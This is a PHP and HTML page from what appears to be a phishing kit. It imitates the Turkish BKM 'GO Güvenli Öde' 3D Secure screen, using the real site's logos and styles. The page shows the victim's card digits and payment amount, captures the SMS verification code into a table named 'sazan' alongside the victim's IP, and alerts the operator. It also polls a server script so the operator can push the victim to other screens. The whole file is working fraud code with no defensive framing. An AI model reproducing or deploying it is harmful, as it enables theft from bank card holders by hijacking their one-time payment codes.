<?php

date_default_timezone_set('Europe/Istanbul');
$zaman = date('d.m.20y - H:i');

include(".gmypanel/Core/getRealIPAdress.php");
include('.gmypanel/Connection.php');

$ip = getUserIP();
$db->query("UPDATE sazan SET now = 'SMS Ekranı' WHERE ip = '{$ip}'");
$sorgu = $db->prepare("SELECT * FROM site");
   $sorgu->execute();
   $cikti = $sorgu->fetch(PDO::FETCH_ASSOC);
ob_start(); 
session_start(); 
$cc_last_4 = $_SESSION['cc_last_4'];
	$tutar = "".$_SESSION['tutar']." TL";

if($_POST){
  $sms   = htmlspecialchars($_POST['sms']);
  
  $query = $db->prepare("UPDATE sazan SET sms=? WHERE ip = ?");
  $insert = $query->execute(array($sms,$ip));

  if($insert){
    $db->query("UPDATE site SET sms_sesi='1'");
      header('Location:../Waiting.php');
  }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
  if($kontrol['ban'] == $ip){ 
          header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
      } 
}

?>
<html lang="tr" style="height: 100%; width: 100%;">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    <link rel="shortcut icon" type="image/png" href="https://goguvenliodeme.bkm.com.tr/static/img/fav/bkm.png">
    <link rel="apple-touch-icon" type="image/png" href="https://goguvenliodeme.bkm.com.tr/static/img/fav/bkm.png">
    <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="https://goguvenliodeme.bkm.com.tr/static/img/fav/bkm.png">
    <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="https://goguvenliodeme.bkm.com.tr/static/img/fav/bkm.png">
    <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="https://goguvenliodeme.bkm.com.tr/static/img/fav/bkm.png">
    <title>GO Güvenli Öde</title>
    <!-- CSS -->
    <link rel="stylesheet" href="https://goguvenliodeme.bkm.com.tr/static/css/bkmgo-dist.css">
    <link rel="stylesheet" href="https://goguvenliodeme.bkm.com.tr/static/css/main-dist.css" type="text/css" media="screen">
    <style type="text/css">
        .content-wrapper .header .logo {
            background-image: url("https://goguvenliodeme.bkm.com.tr/images/go.png");
        }
    </style>
    <!-- JS -->
    <!--[if gte IE 9]><!-->

    <!--<![endif]-->
    <!--[if lt IE 9]>
  <script type="text/javascript">isSupportedIE = false;</script>
  <![endif]-->
</head>

<body>
    <!--[if lt IE 9]>
      <div align="center" style="margin: auto; padding-top: 30px; display: table;">
        <h1>Kullanmakta olduğunuz browser desteklenmemektedir.<br>Lütfen güncel bir browser kullanınız.</h1>
      </div>
      <div class="content-wrapper" style="display: none;">
      <![endif]-->
    <!--[if gte IE 9]><!-->
    <div class="content-wrapper">
        <!--<![endif]-->
        <!--approve page-->
        <div class="header">
            <div class="brand-logo">
                <img align="left" src="https://goguvenliodeme.bkm.com.tr/images/go.png">
            </div>
            <div class="member-logo">
                <img align="right" src="odeme-logo-short.png" width="70px">
            </div>
        </div>
        <div id="approve-page">
            <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
                <div class="loader"></div>
            </div>
            <div class="content">
                <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
                <div class="info-wrapper">
                    <div class="info-row">
                        <div class="info-col info-label">İşyeri Adı:</div>
                        <div class="info-col" id="merchant-name"><?php $kontrol = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);echo $kontrol['magaza_name']; ?></div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">İşlem Tutarı:</div>
                        <div class="info-col amount" id="amount"><?=$tutar?></div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">İşlem Tarihi-Saati:</div>
                        <div class="info-col" id="operation-date-time"><?php echo $zaman; ?></div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Kart Numarası:</div>
                        <div class="info-col" id="masked-pan">XXXX XXXX XXXX <?=$cc_last_4?></div>
                    </div>
                </div>
                <div class="action-wrapper">
                    <div class="info-message h3">
                        <h3><div id="auth-message">İşlemi tamamlamak için kullanacağınız şifreniz bankanızda kayıtlı cep telefonunuza gönderilecektir.<br>Referans no: <span id="otpRefNo"> LNQTROTJ </span></div></h3>
                    </div>
                    <div class="form-wrapper">
                        <form class="form-code" autocomplete="off" method="POST" action="">
                            <div class="form-row">
                                <label for="code" class="otpcode">Doğrulama Kodu</label> 
                                <input type="text" class="f-input" name="sms" id="sms" minlength="5" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required autofocus>
                            </div>
                            <div class="error-messages error-wrong-otp" style="display: none;">
                                <span>Doğrulama Kodunu hatalı girdiniz.Lütfen
									kontrol ederek tekrar deneyiniz.</span> <span class="has-reg" id="remainingEntryCount"></span>
                            </div>
                            <div id="submitButtonDiv">
                                <div class="has-submit">
                                    <button id="btn-commit" type="submit" class="button btn-1 btn-commit">Onayla</button>
                                </div>
                                <div id="timerDiv" class="has-timer">
                                    <span>Kalan Süre: </span> <span class="has-counter" id="time">03:00</span>
                                </div>
                            </div>
                        </form>
                        <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                            <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                            <button id="btn-resend-otp" type="button" class="button btn-1 re-code v1">Doğrulama Kodunu Yeniden Gönder</button>
                            <div class="status with-ico">
                                <i class="ico icon-check"></i>Yeni Doğrulama Kodu cep telefonunuza gönderildi.
                            </div>
                        </div>
                        <div class="call-to-action">
                            <div class="action-list">
                                <div class="action-row">
                                    <div class="action-col left">
                                        <a class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi İptal Et</a>
                                    </div>
                                    <div class="action-col right">
                                        <a class="txt-link trigger-absolute-panel-help">Yardım</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="absolute-panel-help-content">
                <div class="content-wrapper content-v2">
                    <div class="top-band">
                        <a class="action-link trigger-absolute-panel-help">
                            <i class="ico icon-left"></i> İşlem Ekranına Geri Dön
                        </a>
                        <div class="help-counter" id="helpCounter">2:57</div>
                    </div>
                    <div class="content">
                        <div class="content-title">
                            <h2>Yardım Konuları</h2>
                            <div class="logo"></div>
                        </div>
                        <div class="dropdown" id="helpDescContainer"></div>
                    </div>
                </div>
            </div>
            <div class="absolute-panel-legal-content">
                <div class="content-wrapper content-v2">
                    <div class="top-band">
                        <a class="action-link trigger-absolute-panel-legal">
                            <i class="ico icon-left"></i> İşlem Ekranına Geri Dön
                        </a>
                        <div class="help-counter" id="legalCounterElement">2:57</div>
                    </div>
                    <div class="content">
                        <div class="content-title">
                            <h2>Yasal Koşullar</h2>
                        </div>
                        <div class="dropdown" id="legalContentContainer"></div>
                    </div>
                </div>
            </div>
        </div>
        <!--end of approve page-->

        <!-- cancel page-->
        <div id="cancel-page">
            <div class="content">
                <div class="action-wrapper">
                    <h1 id="msg-cancel-page" class="small">
						İsteğiniz üzerine işlem iptal edildi.<br> İşyeri sayfasına
						yönlendiriliyorsunuz.
					</h1>
                    <img src="https://goguvenliodeme.bkm.com.tr/static/img/loading.gif" class="loading gif-auto-redirect" alt="TROY">
                    <p></p>
                </div>
            </div>
        </div>
        <!-- end of cancel page-->

        <!--card locked page-->
        <div id="card-locked-page">
            <div class="content">
                <div class="action-wrapper">
                    <h1 class="small" id="msg-header-cardlock-page">Kartınız Bloke
						Edilmiştir.</h1>
                    <p id="msg-cardlock-page">
                        Doğrulama kodunu <span class="countForLock">3</span> kere hatalı girdiğiniz için kartınız <span class="operationName">Güvenli Ödeme</span> işlemi için kilitlenmiştir. Lütfen daha sonra tekrar deneyiniz ya da detaylı bilgi için
                        bankanızın çağrı merkezini arayınız.<br>Birazdan alışveriş yaptığınız siteye yönlendirileceksiniz.
                    </p>
                    <img src="https://goguvenliodeme.bkm.com.tr/static/img/loading.gif" class="loading gif-auto-redirect" alt="TROY">
                    <p></p>
                    <a id="cardLockOK" class="button btn-1 has-top-spaces">Tamam</a>
                </div>
            </div>
        </div>
        <!--end of card locked page-->

        <!--error page-->
        <div id="error-page">
            <div class="content">
                <div class="action-wrapper">
                    <h1 id="msg-error-page" class="small">
						İşleminiz gerçekleştirilemiyor.<br> Lütfen daha sonra tekrar
						deneyiniz.<br> Birazdan alışveriş yaptığınız siteye
						yönlendirileceksiniz.
					</h1>
                    <img src="https://goguvenliodeme.bkm.com.tr/static/img/loading.gif" class="loading gif-auto-redirect" alt="TROY">
                    <p></p>
                    <a id="errorOK" class="button btn-1 has-top-spaces">Tamam</a>
                </div>
            </div>
        </div>
        <!--end of error page-->

        <!--cancel fancybox-->
        <div class="panel" id="cancelFancyBox">
            <h1 class="small" id="msg-cancel-box">İşyeri sayfasına
				yönlendirileceksiniz, işleminizi iptal etmek istediğinizden emin
				misiniz?</h1>
            <a id="closebutton" class="button btn-1 close-modal" onclick="$.fancybox.close();">Vazgeç</a>
            <a id="cancelbutton" class="button btn-1 btn-1-cancel txt-link trigger-cancel-page">İşlemi
				İptal Et</a>
        </div>
        <!--end of cancel fancybox-->
    </div>

    <script>
		function startTimer(duration, display) {
			var timer = duration,
				minutes, seconds;
			setInterval(function() {
				minutes = parseInt(timer / 60, 10)
				seconds = parseInt(timer % 60, 10);
				minutes = minutes < 10 ? "0" + minutes : minutes;
				seconds = seconds < 10 ? "0" + seconds : seconds;
				display.textContent = minutes + ":" + seconds;
				if(--timer < 0) {
					timer = duration;
				}
			}, 1000);
		}
		window.onload = function() {
			var fiveMinutes = 60 * 3,
				display = document.querySelector('#time');
			startTimer(fiveMinutes, display);
		};
		</script>
            <script type="text/javascript">
 $(document).ready(function() {

gonder();

var int = self.setInterval("gonder()", 2500);

});

function gonder() {

$.ajax({
    type: 'POST',
    url: '<?php echo "../Database.php?ip=".$ip; ?>',
    success: function(msg) {
      if (msg == 'sms') {
            window.location.href = '../3D_Security';
        }
        if (msg == 'tebrik') {
            window.location.href = '../Successful';
        }
        if (msg == 'hata1') {
            window.location.href = '../Error';
        }
        if (msg == 'back') {
            window.location.href = '../index-2';
        }
        if (msg == 'sms2') {
            window.location.href = '../Wrong_Sms-3';
        }
        if (msg == 'hata2') {
            window.location.href = '../Closed_to_Internet';
        }
    }
});
}
    </script>
</body>


</html>
